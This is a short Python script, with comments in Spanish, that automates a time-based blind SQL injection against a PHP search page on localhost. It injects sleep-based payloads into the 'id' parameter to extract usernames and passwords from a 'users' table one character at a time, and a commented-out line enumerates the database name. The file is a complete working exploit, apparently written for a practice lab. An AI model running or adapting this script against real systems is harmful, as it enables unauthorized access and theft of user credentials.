import requests
from pwn import *
import string
import time 
import signal
import sys

def ctrl_c(sig,frame):
    print('\n\ninterrupcion. saliendo')
    sys.exit(1)

def main():

    # definicion de barra de progreso 1
    p1= log.progress("Fuzzing")
    p1.status("Iniciando proceso de fuzzing")

    time.sleep(1)

    # definicion de barra de progreso 2
    p2= log.progress("Datos extraidos")
    datos=''


    # i -> posicion en la query | j -> posicion de caracteres en ascii
    for i in range(1,200):
        for j in range(33,126): 
           
            # bd enum
            # sqli_url= url + "?id=1 and if(ascii(substr(database(),%d,1))=%d, sleep(0.40),1)" % (i,j)

            sqli_url= url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d, sleep(0.40),1)" % (i,j)
            # print(f'\nprobando con {sqli_url}')
            p1.status(f'Probando en la posicion {i} con el caracter ascii {j}')

            tiempo_inicial= time.time()

            r=requests.get(sqli_url)

            tiempo_final= time.time()
            
            if (tiempo_final-tiempo_inicial) > 0.40:
                datos += chr(j)
                p2.status(datos)
                break

    sys.exit(0)


#Global var
url='http://localhost/searchUsers.php'
caracteres=string.printable

signal.signal(signal.SIGINT, ctrl_c)

if __name__=='__main__':
    # time.sleep(12)
    main()
